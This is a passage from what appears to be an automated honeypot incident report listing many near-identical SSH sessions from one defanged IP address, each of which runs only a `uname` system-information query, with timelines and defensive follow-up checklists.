| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:05:52` | `cowrie.session.connect` |
| `2026-07-04 15:05:52` | `cowrie.client.version` |
| `2026-07-04 15:05:52` | `cowrie.client.kex` |
| `2026-07-04 15:05:52` | `cowrie.login.success` |
| `2026-07-04 15:05:53` | `cowrie.session.params` |
| `2026-07-04 15:05:53` | `cowrie.command.input` |
| `2026-07-04 15:05:53` | `cowrie.log.closed` |
| `2026-07-04 15:05:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f267bb3096f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:05 |
| **Last Seen** | 2026-07-04 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:05:55` | `cowrie.session.connect` |
| `2026-07-04 15:05:55` | `cowrie.client.version` |
| `2026-07-04 15:05:55` | `cowrie.client.kex` |
| `2026-07-04 15:05:55` | `cowrie.login.success` |
| `2026-07-04 15:05:57` | `cowrie.session.params` |
| `2026-07-04 15:05:57` | `cowrie.command.input` |
| `2026-07-04 15:05:57` | `cowrie.log.closed` |
| `2026-07-04 15:05:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1f7682918de

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:05 |
| **Last Seen** | 2026-07-04 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:05:59` | `cowrie.session.connect` |
| `2026-07-04 15:05:59` | `cowrie.client.version` |
| `2026-07-04 15:05:59` | `cowrie.client.kex` |
| `2026-07-04 15:05:59` | `cowrie.login.success` |
| `2026-07-04 15:06:00` | `cowrie.session.params` |
| `2026-07-04 15:06:00` | `cowrie.command.input` |
| `2026-07-04 15:06:00` | `cowrie.log.closed` |
| `2026-07-04 15:06:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5573b540d2fc

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:06 |
| **Last Seen** | 2026-07-04 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:06:02` | `cowrie.session.connect` |
| `2026-07-04 15:06:02` | `cowrie.client.version` |
| `2026-07-04 15:06:02` | `cowrie.client.kex` |
| `2026-07-04 15:06:02` | `cowrie.login.success` |
| `2026-07-04 15:06:03` | `cowrie.session.params` |
| `2026-07-04 15:06:03` | `cowrie.command.input` |
| `2026-07-04 15:06:03` | `cowrie.log.closed` |
| `2026-07-04 15:06:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e96c84f71fb

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:06 |
| **Last Seen** | 2026-07-04 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:06:05` | `cowrie.session.connect` |
| `2026-07-04 15:06:05` | `cowrie.client.version` |
| `2026-07-04 15:06:05` | `cowrie.client.kex` |
| `2026-07-04 15:06:05` | `cowrie.login.success` |
| `2026-07-04 15:06:06` | `cowrie.session.params` |
| `2026-07-04 15:06:06` | `cowrie.command.input` |
| `2026-07-04 15:06:07` | `cowrie.log.closed` |
| `2026-07-04 15:06:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aef263423945

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:06 |
| **Last Seen** | 2026-07-04 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:06:09` | `cowrie.session.connect` |
| `2026-07-04 15:06:09` | `cowrie.client.version` |
| `2026-07-04 15:06:09` | `cowrie.client.kex` |
| `2026-07-04 15:06:09` | `cowrie.login.success` |
| `2026-07-04 15:06:10` | `cowrie.session.params` |
| `2026-07-04 15:06:10` | `cowrie.command.input` |
| `2026-07-04 15:06:10` | `cowrie.log.closed` |
| `2026-07-04 15:06:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8db4c17b73f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:06 |
| **Last Seen** | 2026-07-04 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:06:12` | `cowrie.session.connect` |
| `2026-07-04 15:06:12` | `cowrie.client.version` |
| `2026-07-04 15:06:12` | `cowrie.client.kex` |
| `2026-07-04 15:06:12` | `cowrie.login.success` |
| `2026-07-04 15:06:13` | `cowrie.session.params` |
| `2026-07-04 15:06:13` | `cowrie.command.input` |
| `2026-07-04 15:06:13` | `cowrie.log.closed` |
| `2026-07-04 15:06:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e30cbcbbeec

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:06 |
| **Last Seen** | 2026-07-04 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:06:15` | `cowrie.session.connect` |
| `2026-07-04 15:06:15` | `cowrie.client.version` |
| `2026-07-04 15:06:15` | `cowrie.client.kex` |
| `2026-07-04 15:06:15` | `cowrie.login.success` |
| `2026-07-04 15:06:17` | `cowrie.session.params` |
| `2026-07-04 15:06:17` | `cowrie.command.input` |
| `2026-07-04 15:06:17` | `cowrie.log.closed` |
| `2026-07-04 15:06:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63d441c87de6

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:06 |
| **Last Seen** | 2026-07-04 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:06:18` | `cowrie.session.connect` |
| `2026-07-04 15:06:18` | `cowrie.client.version` |
| `2026-07-04 15:06:19` | `cowrie.client.kex` |
| `2026-07-04 15:06:19` | `cowrie.login.success` |
| `2026-07-04 15:06:20` | `cowrie.session.params` |
| `2026-07-04 15:06:20` | `cowrie.command.input` |
| `2026-07-04 15:06:20` | `cowrie.log.closed` |
| `2026-07-04 15:06:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1eaa10c6aff

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:06 |
| **Last Seen** | 2026-07-04 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:06:22` | `cowrie.session.connect` |
| `2026-07-04 15:06:22` | `cowrie.client.version` |
| `2026-07-04 15:06:22` | `cowrie.client.kex` |
| `2026-07-04 15:06:22` | `cowrie.login.success` |
| `2026-07-04 15:06:23` | `cowrie.session.params` |
| `2026-07-04 15:06:23` | `cowrie.command.input` |
| `2026-07-04 15:06:23` | `cowrie.log.closed` |
| `2026-07-04 15:06:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31221724961a

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:06 |
| **Last Seen** | 2026-07-04 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:06:25` | `cowrie.session.connect` |
| `2026-07-04 15:06:25` | `cowrie.client.version` |
| `2026-07-04 15:06:25` | `cowrie.client.kex` |
| `2026-07-04 15:06:26` | `cowrie.login.success` |
| `2026-07-04 15:06:26` | `cowrie.session.params` |
| `2026-07-04 15:06:26` | `cowrie.command.input` |
| `2026-07-04 15:06:26` | `cowrie.log.closed` |
| `2026-07-04 15:06:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01b4a561147b

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:06 |
| **Last Seen** | 2026-07-04 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:06:28` | `cowrie.session.connect` |
| `2026-07-04 15:06:28` | `cowrie.client.version` |
| `2026-07-04 15:06:29` | `cowrie.client.kex` |
| `2026-07-04 15:06:29` | `cowrie.login.success` |
| `2026-07-04 15:06:30` | `cowrie.session.params` |
| `2026-07-04 15:06:30` | `cowrie.command.input` |
| `2026-07-04 15:06:30` | `cowrie.log.closed` |
| `2026-07-04 15:06:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7c320380289

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:06 |
| **Last Seen** | 2026-07-04 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:06:32` | `cowrie.session.connect` |
| `2026-07-04 15:06:32` | `cowrie.client.version` |
| `2026-07-04 15:06:32` | `cowrie.client.kex` |
| `2026-07-04 15:06:32` | `cowrie.login.success` |
| `2026-07-04 15:06:33` | `cowrie.session.params` |
| `2026-07-04 15:06:33` | `cowrie.command.input` |
| `2026-07-04 15:06:33` | `cowrie.log.closed` |
| `2026-07-04 15:06:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27fed45a2fcf

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:06 |
| **Last Seen** | 2026-07-04 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:06:35` | `cowrie.session.connect` |
| `2026-07-04 15:06:35` | `cowrie.client.version` |
| `2026-07-04 15:06:35` | `cowrie.client.kex` |
| `2026-07-04 15:06:36` | `cowrie.login.success` |
| `2026-07-04 15:06:36` | `cowrie.session.params` |
| `2026-07-04 15:06:36` | `cowrie.command.input` |
| `2026-07-04 15:06:37` | `cowrie.log.closed` |
| `2026-07-04 15:06:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2467d78b955

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:06 |
| **Last Seen** | 2026-07-04 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:06:39` | `cowrie.session.connect` |
| `2026-07-04 15:06:39` | `cowrie.client.version` |
| `2026-07-04 15:06:39` | `cowrie.client.kex` |
| `2026-07-04 15:06:39` | `cowrie.login.success` |
| `2026-07-04 15:06:40` | `cowrie.session.params` |
| `2026-07-04 15:06:40` | `cowrie.command.input` |
| `2026-07-04 15:06:40` | `cowrie.log.closed` |
| `2026-07-04 15:06:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2c8226ce9f6

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:06 |
| **Last Seen** | 2026-07-04 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:06:42` | `cowrie.session.connect` |
| `2026-07-04 15:06:42` | `cowrie.client.version` |
| `2026-07-04 15:06:42` | `cowrie.client.kex` |
| `2026-07-04 15:06:43` | `cowrie.login.success` |
| `2026-07-04 15:06:43` | `cowrie.session.params` |
| `2026-07-04 15:06:43` | `cowrie.command.input` |
| `2026-07-04 15:06:44` | `cowrie.log.closed` |
| `2026-07-04 15:06:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93bf908189d6

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:06 |
| **Last Seen** | 2026-07-04 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:06:46` | `cowrie.session.connect` |
| `2026-07-04 15:06:46` | `cowrie.client.version` |
| `2026-07-04 15:06:46` | `cowrie.client.kex` |
| `2026-07-04 15:06:46` | `cowrie.login.success` |
| `2026-07-04 15:06:47` | `cowrie.session.params` |
| `2026-07-04 15:06:47` | `cowrie.command.input` |
| `2026-07-04 15:06:47` | `cowrie.log.closed` |
| `2026-07-04 15:06:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb51151a58a5

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:06 |
| **Last Seen** | 2026-07-04 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:06:49` | `cowrie.session.connect` |
| `2026-07-04 15:06:49` | `cowrie.client.version` |
| `2026-07-04 15:06:49` | `cowrie.client.kex` |
| `2026-07-04 15:06:49` | `cowrie.login.success` |
| `2026-07-04 15:06:50` | `cowrie.session.params` |
| `2026-07-04 15:06:50` | `cowrie.command.input` |
| `2026-07-04 15:06:50` | `cowrie.log.closed` |
| `2026-07-04 15:06:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-075e4a9a639d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:06 |
| **Last Seen** | 2026-07-04 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:06:52` | `cowrie.session.connect` |
| `2026-07-04 15:06:52` | `cowrie.client.version` |
| `2026-07-04 15:06:52` | `cowrie.client.kex` |
| `2026-07-04 15:06:53` | `cowrie.login.success` |
| `2026-07-04 15:06:54` | `cowrie.session.params` |
| `2026-07-04 15:06:54` | `cowrie.command.input` |
| `2026-07-04 15:06:54` | `cowrie.log.closed` |
| `2026-07-04 15:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9eb0631eb41

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:06 |
| **Last Seen** | 2026-07-04 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:06:56` | `cowrie.session.connect` |
| `2026-07-04 15:06:56` | `cowrie.client.version` |
| `2026-07-04 15:06:56` | `cowrie.client.kex` |
| `2026-07-04 15:06:56` | `cowrie.login.success` |
| `2026-07-04 15:06:57` | `cowrie.session.params` |
| `2026-07-04 15:06:57` | `cowrie.command.input` |
| `2026-07-04 15:06:57` | `cowrie.log.closed` |
| `2026-07-04 15:06:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edcd55dacaa7

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:06 |
| **Last Seen** | 2026-07-04 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:06:59` | `cowrie.session.connect` |
| `2026-07-04 15:06:59` | `cowrie.client.version` |
| `2026-07-04 15:06:59` | `cowrie.client.kex` |
| `2026-07-04 15:06:59` | `cowrie.login.success` |
| `2026-07-04 15:07:00` | `cowrie.session.params` |
| `2026-07-04 15:07:00` | `cowrie.command.input` |
| `2026-07-04 15:07:00` | `cowrie.log.closed` |
| `2026-07-04 15:07:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8438dc6dc199

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:07 |
| **Last Seen** | 2026-07-04 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:07:02` | `cowrie.session.connect` |
| `2026-07-04 15:07:02` | `cowrie.client.version` |
| `2026-07-04 15:07:03` | `cowrie.client.kex` |
| `2026-07-04 15:07:03` | `cowrie.login.success` |
| `2026-07-04 15:07:04` | `cowrie.session.params` |
| `2026-07-04 15:07:04` | `cowrie.command.input` |
| `2026-07-04 15:07:04` | `cowrie.log.closed` |
| `2026-07-04 15:07:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1677124337d9

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:07 |
| **Last Seen** | 2026-07-04 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:07:06` | `cowrie.session.connect` |
| `2026-07-04 15:07:06` | `cowrie.client.version` |
| `2026-07-04 15:07:06` | `cowrie.client.kex` |
| `2026-07-04 15:07:07` | `cowrie.login.success` |
| `2026-07-04 15:07:07` | `cowrie.session.params` |
| `2026-07-04 15:07:07` | `cowrie.command.input` |
| `2026-07-04 15:07:08` | `cowrie.log.closed` |
| `2026-07-04 15:07:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5277870e7490

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:07 |
| **Last Seen** | 2026-07-04 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:07:09` | `cowrie.session.connect` |
| `2026-07-04 15:07:09` | `cowrie.client.version` |
| `2026-07-04 15:07:09` | `cowrie.client.kex` |
| `2026-07-04 15:07:10` | `cowrie.login.success` |
| `2026-07-04 15:07:10` | `cowrie.session.params` |
| `2026-07-04 15:07:10` | `cowrie.command.input` |
| `2026-07-04 15:07:11` | `cowrie.log.closed` |
| `2026-07-04 15:07:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-901fb0b57cff

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:07 |
| **Last Seen** | 2026-07-04 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:07:13` | `cowrie.session.connect` |
| `2026-07-04 15:07:13` | `cowrie.client.version` |
| `2026-07-04 15:07:13` | `cowrie.client.kex` |
| `2026-07-04 15:07:13` | `cowrie.login.success` |
| `2026-07-04 15:07:14` | `cowrie.session.params` |
| `2026-07-04 15:07:14` | `cowrie.command.input` |
| `2026-07-04 15:07:14` | `cowrie.log.closed` |
| `2026-07-04 15:07:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9af5d3cad11d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:07 |
| **Last Seen** | 2026-07-04 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:07:16` | `cowrie.session.connect` |
| `2026-07-04 15:07:16` | `cowrie.client.version` |
| `2026-07-04 15:07:16` | `cowrie.client.kex` |
| `2026-07-04 15:07:17` | `cowrie.login.success` |
| `2026-07-04 15:07:17` | `cowrie.session.params` |
| `2026-07-04 15:07:17` | `cowrie.command.input` |
| `2026-07-04 15:07:18` | `cowrie.log.closed` |
| `2026-07-04 15:07:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
